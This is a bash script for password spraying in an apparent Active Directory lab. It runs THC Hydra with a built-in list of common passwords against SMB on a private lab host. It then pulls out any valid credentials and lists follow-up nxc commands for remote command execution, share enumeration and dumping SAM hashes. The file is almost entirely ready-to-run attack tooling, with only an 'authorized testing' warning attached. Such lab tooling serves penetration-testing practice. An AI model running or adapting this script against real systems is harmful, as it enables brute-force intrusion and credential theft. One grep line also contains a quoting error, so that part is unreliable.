#!/bin/bash
# Password Spraying Script for AD Lab
# Uses THC Hydra for SMB password spraying
# WARNING: For authorized testing only!

set -e

# Color codes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

# Configuration
TARGET_IP="192.168.56.102"
TARGET_DOMAIN="windomain.local"
PASSWORD_LIST="/tmp/passwordlist"
USERNAME="vagrant"

# Create default password list if it doesn't exist
if [ ! -f "$PASSWORD_LIST" ]; then
    echo -e "${CYAN}[*] Creating default password list...${NC}"
    cat > "$PASSWORD_LIST" << 'EOF'
password
123456
12345678
qwerty
abc123
monkey
letmein
dragon
111111
baseball
iloveyou
trustno1
sunshine
princess
admin
welcome
shadow
ashley
football
jesus
michael
ninja
mustang
password1
123456789
diamond
admin123
letmein1
photoshop
qwerty123
qaz123wsx
qwertyuiop
login
master
hello
freedom
whatever
qazxsw
trustno1
batman
passw0rd
hacker
vagrant
EOF
    echo -e "${GREEN}[+] Password list created at $PASSWORD_LIST${NC}"
fi

echo -e "${CYAN}========================================${NC}"
echo -e "${CYAN}  Password Spraying Script              ${NC}"
echo -e "${CYAN}  Target: $TARGET_IP                   ${NC}"
echo -e "${CYAN}  Username: $USERNAME                  ${NC}"
echo -e "${CYAN}========================================${NC}"
echo ""

# Check if hydra is installed
if ! command -v hydra &> /dev/null; then
    echo -e "${YELLOW}[!] Hydra not found. Attempting to install...${NC}"
    apt-get update && apt-get install -y hydra
fi

echo -e "${YELLOW}[Phase 1] SMB Password Spray${NC}"
echo "----------------------------------------"
echo -e "${CYAN}[*] Spraying passwords against SMB service...${NC}"
echo -e "${CYAN}    User: $USERNAME${NC}"
echo -e "${CYAN}    Passwords: $(wc -l < $PASSWORD_LIST)${NC}"
echo ""

# Run Hydra SMB password spray
# -l: single username
# -P: password list file
# smb://target: target protocol and IP address
hydra -l "$USERNAME" -P "$PASSWORD_LIST" smb://"$TARGET_IP" 2>&1 | tee "/tmp/spray_results_$(date +%Y%m%d_%H%M%S).txt"

echo ""
echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}  Password Spray Complete!              ${NC}"
echo -e "${GREEN}========================================${NC}"
echo ""
echo -e "${YELLOW}Review the output above for valid credentials.${NC}"
echo ""

# Extract valid credentials from results
echo -e "${CYAN}[*] Checking for successful authentications...${NC}"
if grep -q "login:\|password:\|SUCCESS\|host:\" "/tmp/spray_results_"*.txt 2>/dev/null; then
    echo -e "${GREEN}[+] Valid credentials may have been found.${NC}"
    grep -E "login:|password:|host:" "/tmp/spray_results_"*.txt | tail -10
else
    echo -e "${YELLOW}[!] Review the output manually for results.${NC}"
fi

echo ""
echo -e "${YELLOW}Next steps:${NC}"
echo "  1. If successful, run: nxc smb $TARGET_IP -u <user> -p <password> -x 'whoami /priv'"
echo "  2. Enumerate shares: nxc smb $TARGET_IP -u <user> -p <password> --shares"
echo "  3. Dump SAM: nxc smb $TARGET_IP -u <user> -p <password> --sam"
echo ""
